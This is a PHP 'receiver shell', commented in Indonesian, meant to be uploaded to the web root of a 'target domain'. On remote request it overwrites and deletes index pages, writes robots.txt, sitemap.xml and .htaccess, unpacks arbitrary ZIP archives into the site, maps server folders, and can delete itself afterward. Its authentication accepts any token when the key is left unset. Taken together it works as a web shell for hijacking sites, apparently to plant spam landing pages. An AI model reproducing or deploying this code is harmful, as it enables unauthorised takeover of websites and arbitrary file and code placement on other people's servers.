<?php
/**
 * =========================================================================
 * FLASH REMOTE DEPLOY RECEIVER SHELL (Otomatis Pasang LP, Sitemap & Robots)
 * =========================================================================
 * 
 * Petunjuk Penggunaan:
 * 1. Unggah berkas ini ke direktori utama (root / public_html) domain target Anda.
 * 2. Masukkan URL berkas ini (contoh: https://domain-anda.com/receiver.php)
 *    dan Kunci Rahasia (Deploy Key) ke form Auto-Deploy di FLASH Builder.
 * 3. Klik "Deploy Sekarang". Berkas index.html/php, sitemap.xml, dan robots.txt
 *    akan terpasang secara instan dan otomatis!
 */

@ini_set('display_errors', '0');
@error_reporting(0);
@ini_set('memory_limit', '256M');
@set_time_limit(120);

// Header Keamanan & CORS
header('Content-Type: application/json; charset=utf-8');
header('X-Robots-Tag: noindex, nofollow, noarchive');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-FLASH-DEPLOY-KEY, Authorization');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Support JSON Payload jika dikirim via application/json
$rawInput = @file_get_contents('php://input');
if (!empty($rawInput)) {
    $decodedJson = @json_decode($rawInput, true);
    if (is_array($decodedJson)) {
        $_POST = array_merge($_POST, $decodedJson);
    }
}

// Kunci keamanan deployment (Diisi otomatis saat diunduh dari FLASH Builder)
define('FLASH_DEPLOY_KEY', '{{DEPLOY_KEY}}');

// Tangkap token keamanan dari Header atau POST
$clientToken = $_POST['token'] ?? $_SERVER['HTTP_X_FLASH_DEPLOY_KEY'] ?? $_GET['token'] ?? '';

// Verifikasi Keamanan Token
if (FLASH_DEPLOY_KEY !== '{{DEPLOY_KEY}}' && !empty(FLASH_DEPLOY_KEY)) {
    if (!hash_equals(FLASH_DEPLOY_KEY, (string)$clientToken)) {
        http_response_code(403);
        echo json_encode([
            'success' => false,
            'message' => 'Akses ditolak: Deploy Key / Token keamanan salah atau tidak sesuai.'
        ]);
        exit;
    }
} elseif (empty($clientToken)) {
    http_response_code(403);
    echo json_encode([
        'success' => false,
        'message' => 'Token otentikasi wajib dikirimkan untuk keamanan remote shell.'
    ]);
    exit;
}

$action = strtolower(trim($_POST['action'] ?? $_GET['action'] ?? 'ping'));
$targetDir = __DIR__;

// 1. PING / TEST KONEKSI & DETEKSI PATH FOLDER SERVER TARGET
if ($action === 'ping' || $action === 'test') {
    // Pindai daftar folder/direktori termasuk nested subfolder (folder di dalam folder)
    $subfolders = [];
    $existingIndexes = [];

    $scanFolders = function($dir, $prefix = '') use (&$scanFolders, &$subfolders, $targetDir) {
        $items = @scandir($dir);
        if (!$items) return;
        foreach ($items as $item) {
            if ($item === '.' || $item === '..' || substr($item, 0, 1) === '.') continue;
            if (in_array(strtolower($item), ['node_modules', 'vendor', '.git', 'cache', 'logs'])) continue;
            $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($fullPath)) {
                $relPath = $prefix ? ($prefix . '/' . $item) : $item;
                $subfolders[] = $relPath;
                // Pindai hingga kedalaman 2 tingkat
                if (substr_count($relPath, '/') < 2) {
                    $scanFolders($fullPath, $relPath);
                }
            }
        }
    };
    $scanFolders($targetDir);

    // Cek file index yang ada di root direktori
    foreach (['index.php', 'index.html', 'index.htm', 'default.html', 'default.htm', 'home.html'] as $idxFile) {
        if (file_exists($targetDir . DIRECTORY_SEPARATOR . $idxFile)) {
            $existingIndexes[] = $idxFile;
        }
    }

    echo json_encode([
        'success'          => true,
        'status'           => 'online',
        'message'          => 'Receiver Shell FLASH aktif & path folder bersarang berhasil terdeteksi!',
        'writable'         => is_writable($targetDir),
        'php'              => PHP_VERSION,
        'server_ip'        => $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'Unknown',
        'domain'           => $_SERVER['HTTP_HOST'] ?? 'Unknown',
        'current_path'     => realpath($targetDir),
        'document_root'    => $_SERVER['DOCUMENT_ROOT'] ?? realpath($targetDir),
        'subfolders'       => array_values($subfolders),
        'existing_indexes' => $existingIndexes,
        'is_public_html'   => (bool)preg_match('/public_html|www|htdocs/i', realpath($targetDir))
    ]);
    exit;
}

// 2. DEPLOY BERKAS UTAMA (INDEX, SITEMAP, ROBOTS, HTACCESS)
if ($action === 'deploy') {
    $writtenFiles = [];
    $errors = [];

    // Opsi target subfolder jika user memilih folder tertentu (mendukung folder bersarang / nested subfolder)
    $targetFolder = trim($_POST['target_folder'] ?? '');
    $cleanSub = '';
    if (!empty($targetFolder) && $targetFolder !== '/' && $targetFolder !== '.') {
        $cleanSub = trim(str_replace(['..', "\0"], '', $targetFolder), "/\\");
        if (!empty($cleanSub)) {
            $destDir = $targetDir . DIRECTORY_SEPARATOR . str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $cleanSub);
            if (!is_dir($destDir)) {
                @mkdir($destDir, 0755, true);
            }
            if (is_dir($destDir)) {
                $targetDir = $destDir;
            }
        }
    }

    // Pastikan folder bisa ditulis
    if (!is_writable($targetDir)) {
        http_response_code(500);
        echo json_encode([
            'success' => false,
            'message' => 'Direktori tujuan hosting (' . realpath($targetDir) . ') tidak memiliki izin tulis (CHMOD write permission). Ubah permission menjadi 0755.'
        ]);
        exit;
    }

    // A. Deploy & Tebas File Index (index.html & index.php)
    $tebasIndex = isset($_POST['tebas_index']) ? ($_POST['tebas_index'] == '1') : true;
    $indexType = strtolower(trim($_POST['index_type'] ?? 'html'));
    $indexName = ($indexType === 'php') ? 'index.php' : 'index.html';
    $indexContent = $_POST['index_content'] ?? '';

    if (!empty($indexContent)) {
        $indexPath = $targetDir . DIRECTORY_SEPARATOR . $indexName;
        if (@file_put_contents($indexPath, $indexContent) !== false) {
            @chmod($indexPath, 0644);
            $writtenFiles[] = $indexName;
        } else {
            $errors[] = "Gagal menulis {$indexName}";
        }

        // Mode Tebas Index: Tebas berkas index pasangannya agar Apache/LiteSpeed/Nginx langsung me-load halaman baru
        if ($tebasIndex) {
            if ($indexName === 'index.html') {
                // Jika primary index.html, tebas index.php dengan PHP runner yang mengarah langsung ke index.html
                $phpBridge = "<?php\n// FLASH Tebas Index Bridge\nif (file_exists(__DIR__ . '/index.html')) {\n    include_once __DIR__ . '/index.html';\n    exit;\n}\n";
                @file_put_contents($targetDir . DIRECTORY_SEPARATOR . 'index.php', $phpBridge);
                @chmod($targetDir . DIRECTORY_SEPARATOR . 'index.php', 0644);
                $writtenFiles[] = 'index.php (ditebas)';
            } else {
                // Jika primary index.php, tebas juga index.html
                @file_put_contents($targetDir . DIRECTORY_SEPARATOR . 'index.html', $indexContent);
                @chmod($targetDir . DIRECTORY_SEPARATOR . 'index.html', 0644);
                $writtenFiles[] = 'index.html (ditebas)';
            }

            // Bersihkan file index lain yang mungkin mengganggu
            foreach (['index.htm', 'default.html', 'default.htm', 'home.html'] as $altIdx) {
                $altPath = $targetDir . DIRECTORY_SEPARATOR . $altIdx;
                if (file_exists($altPath)) {
                    @unlink($altPath);
                    $writtenFiles[] = "{$altIdx} (dibersihkan)";
                }
            }
        }
    }

    // B. Deploy sitemap.xml (Tulis di target folder dan root jika berbeda)
    $sitemapContent = $_POST['sitemap_content'] ?? '';
    if (!empty($sitemapContent)) {
        $sitemapPath = $targetDir . DIRECTORY_SEPARATOR . 'sitemap.xml';
        if (@file_put_contents($sitemapPath, $sitemapContent) !== false) {
            @chmod($sitemapPath, 0644);
            $writtenFiles[] = 'sitemap.xml';
        } else {
            $errors[] = "Gagal menulis sitemap.xml";
        }
        // Jika targetDir adalah subfolder, pasang juga di root hosting agar Googlebot menemukan di domain.com/sitemap.xml
        if ($targetDir !== __DIR__ && is_writable(__DIR__)) {
            @file_put_contents(__DIR__ . DIRECTORY_SEPARATOR . 'sitemap.xml', $sitemapContent);
        }
    }

    // C. Deploy robots.txt (Tulis di target folder dan root)
    $robotsContent = $_POST['robots_content'] ?? '';
    if (!empty($robotsContent)) {
        $robotsPath = $targetDir . DIRECTORY_SEPARATOR . 'robots.txt';
        if (@file_put_contents($robotsPath, $robotsContent) !== false) {
            @chmod($robotsPath, 0644);
            $writtenFiles[] = 'robots.txt';
        } else {
            $errors[] = "Gagal menulis robots.txt";
        }
        // Pasang juga di root hosting jika berada di subfolder
        if ($targetDir !== __DIR__ && is_writable(__DIR__)) {
            @file_put_contents(__DIR__ . DIRECTORY_SEPARATOR . 'robots.txt', $robotsContent);
        }
    }

    // D. Deploy .htaccess (Opsional)
    $htaccessContent = $_POST['htaccess_content'] ?? '';
    if (!empty($htaccessContent)) {
        $htaccessPath = $targetDir . DIRECTORY_SEPARATOR . '.htaccess';
        // Simpan hanya jika belum ada atau diperintahkan overwrite
        if (@file_put_contents($htaccessPath, $htaccessContent) !== false) {
            @chmod($htaccessPath, 0644);
            $writtenFiles[] = '.htaccess';
        }
    }

    // E. Unpack ZIP Aset Media jika ada
    if (!empty($_POST['assets_zip_b64']) && class_exists('ZipArchive')) {
        $zipData = base64_decode($_POST['assets_zip_b64']);
        if ($zipData) {
            $tmpZip = $targetDir . DIRECTORY_SEPARATOR . 'tmp_deploy_' . uniqid() . '.zip';
            file_put_contents($tmpZip, $zipData);
            $zip = new ZipArchive();
            if ($zip->open($tmpZip) === true) {
                $zip->extractTo($targetDir);
                $zip->close();
                $writtenFiles[] = 'assets_unpacked';
            }
            @unlink($tmpZip);
        }
    }

    // F. Opsi Penghancuran Diri Shell (Self-Destruct setelah deploy sukses)
    $selfDestruct = !empty($_POST['self_destruct']) && $_POST['self_destruct'] == '1';
    if ($selfDestruct) {
        register_shutdown_function(function() {
            @unlink(__FILE__);
        });
    }

    if (count($writtenFiles) > 0) {
        echo json_encode([
            'success'        => true,
            'message'        => 'Otomatisasi deployment berhasil! File index, sitemap.xml, dan robots.txt telah terpasang sempurna.',
            'written_files'  => $writtenFiles,
            'errors'         => $errors,
            'self_destruct'  => $selfDestruct,
            'deployed_at'    => date('Y-m-d H:i:s'),
            'target_domain'  => ($_SERVER['HTTP_HOST'] ?? '')
        ]);
        exit;
    } else {
        http_response_code(500);
        echo json_encode([
            'success' => false,
            'message' => 'Gagal memasang berkas: ' . implode(', ', $errors)
        ]);
        exit;
    }
}

// Default response
echo json_encode([
    'success' => false,
    'message' => 'Aksi tidak dikenal.'
]);
